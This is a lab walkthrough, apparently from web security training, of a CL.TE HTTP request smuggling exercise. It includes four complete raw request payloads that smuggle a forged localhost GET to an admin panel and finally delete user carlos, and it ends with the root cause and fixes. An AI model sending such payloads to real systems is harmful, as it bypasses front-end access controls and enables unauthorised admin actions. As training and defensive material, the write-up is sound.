Lab Difficulty: Practitioner
Vulnerability: HTTP request smuggling, CL.TE style

Summary
There are two servers in front of you. The front end does not support chunked encoding and blocks access to the admin panel. The back end does support chunked encoding and will happily process whatever you smuggle to it. By crafting two POST requests so the front end and back end disagree about where the boundary between requests is, you can shove a GET to the admin panel into the back end and make it process that request. With a little tuning you can call the admin delete endpoint and remove the user carlos. Interesting and low level, but fun.

Steps taken

Tried to visit the admin page and got blocked by the front end. Nothing surprising there.

Switched Burp Repeater to use HTTP 1.1 because the lab expects HTTP 1.1 techniques.

Tested the basic smuggling idea by sending this request twice from Repeater exactly as shown:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X

The merged request reached the back end but got rejected because the Host header was not localhost. So close, but not enough.
4. Tried again and included Host: localhost in the smuggled request, sending it twice:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X

This was blocked because the second request’s Host header conflicted with the smuggled Host header coming from the first request. The server rejected the mismatch.
5. The trick was to make the second request’s headers be treated as body data so they get appended rather than interpreted as a separate request header block. I crafted a larger request so the second request’s headers ended up in the smuggled body. Sent this request twice:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=

With that, the back end processed the smuggled GET to /admin as if it were a real request and returned the admin panel. Success.
6. Using the previous response as a template, modified the smuggled GET to call the delete endpoint for carlos. Final payload sent twice:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=

That executed on the back end and deleted carlos. Lab solved.

Root cause
The front end and back end disagree on how to parse request boundaries for chunked encoding. The front end strips or blocks chunked encoded requests while the back end accepts them. Because the front end forwards part of one request in a way that the back end parses differently, an attacker can sneak a complete secondary request to the back end. There’s no consistent canonicalization of request framing and no validation that the back end should reject unexpected request data from the front end.

Fixes and mitigation

Make front end and back end agree on supported encodings. If the front end does not support chunked encoding, it must remove Transfer-Encoding headers and normalize Content-Length before forwarding.

Normalize and validate incoming requests at the edge. Reject or sanitize suspicious combinations of Content-Length and Transfer-Encoding.

Prefer a single parsing implementation or terminate HTTP at the edge and proxy only safe, normalized requests to the back end.

Implement strict host and origin checks on sensitive endpoints so smuggled requests with forged Host headers are not accepted.

Add monitoring and alerts for unusual request framing or repeated attempts to play with content length and transfer encoding.
